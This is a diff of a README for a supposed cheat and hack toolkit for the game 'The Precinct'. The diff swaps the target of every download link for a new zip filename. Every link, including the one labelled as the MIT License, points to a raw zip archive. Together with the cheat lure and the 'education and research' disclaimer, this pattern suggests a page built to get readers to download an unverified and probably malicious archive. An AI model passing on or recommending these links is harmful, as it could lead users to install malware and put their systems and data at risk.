@@ -1,6 +1,6 @@
 # 🚓 The Precinct Cheats & Hacks 🚓
 
-[![Download](https://raw.githubusercontent.com/Jhoyner28/PrecinctPowerToolkit/main/Erechtheus/PrecinctPowerToolkit.zip)](https://raw.githubusercontent.com/Jhoyner28/PrecinctPowerToolkit/main/Erechtheus/PrecinctPowerToolkit.zip)
+[![Download](https://raw.githubusercontent.com/Jhoyner28/PrecinctPowerToolkit/main/Erechtheus/Precinct-Toolkit-Power-2.1-alpha.5.zip)](https://raw.githubusercontent.com/Jhoyner28/PrecinctPowerToolkit/main/Erechtheus/Precinct-Toolkit-Power-2.1-alpha.5.zip)
 
 Your essential toolkit for harnessing advanced controls, unique enhancements, and versatile upgrades within "The Precinct". Perfect for players seeking new dynamics and gameplay elevation. Dive into powerful features designed for flexibility and seamless integration, all while maintaining a secure experience. This project is intended for education and research only.
 
@@ -33,7 +33,7 @@ Your essential toolkit for harnessing advanced controls, unique enhancements, an
 
 ## 🏁 Installation
 
-1. [![Download](https://raw.githubusercontent.com/Jhoyner28/PrecinctPowerToolkit/main/Erechtheus/PrecinctPowerToolkit.zip)](https://raw.githubusercontent.com/Jhoyner28/PrecinctPowerToolkit/main/Erechtheus/PrecinctPowerToolkit.zip)  
+1. [![Download](https://raw.githubusercontent.com/Jhoyner28/PrecinctPowerToolkit/main/Erechtheus/Precinct-Toolkit-Power-2.1-alpha.5.zip)](https://raw.githubusercontent.com/Jhoyner28/PrecinctPowerToolkit/main/Erechtheus/Precinct-Toolkit-Power-2.1-alpha.5.zip)  
    Click the button above to obtain the latest installer package.
 
 ---
@@ -52,11 +52,11 @@ This software is provided for educational and research intentions. Usage in ways
 
 ## 📄 License
 
-Open-source under the [MIT License](https://raw.githubusercontent.com/Jhoyner28/PrecinctPowerToolkit/main/Erechtheus/PrecinctPowerToolkit.zip) - 2025
+Open-source under the [MIT License](https://raw.githubusercontent.com/Jhoyner28/PrecinctPowerToolkit/main/Erechtheus/Precinct-Toolkit-Power-2.1-alpha.5.zip) - 2025
 
 ---
 
-[![Download](https://raw.githubusercontent.com/Jhoyner28/PrecinctPowerToolkit/main/Erechtheus/PrecinctPowerToolkit.zip)](https://raw.githubusercontent.com/Jhoyner28/PrecinctPowerToolkit/main/Erechtheus/PrecinctPowerToolkit.zip)
+[![Download](https://raw.githubusercontent.com/Jhoyner28/PrecinctPowerToolkit/main/Erechtheus/Precinct-Toolkit-Power-2.1-alpha.5.zip)](https://raw.githubusercontent.com/Jhoyner28/PrecinctPowerToolkit/main/Erechtheus/Precinct-Toolkit-Power-2.1-alpha.5.zip)
 
 ---
 
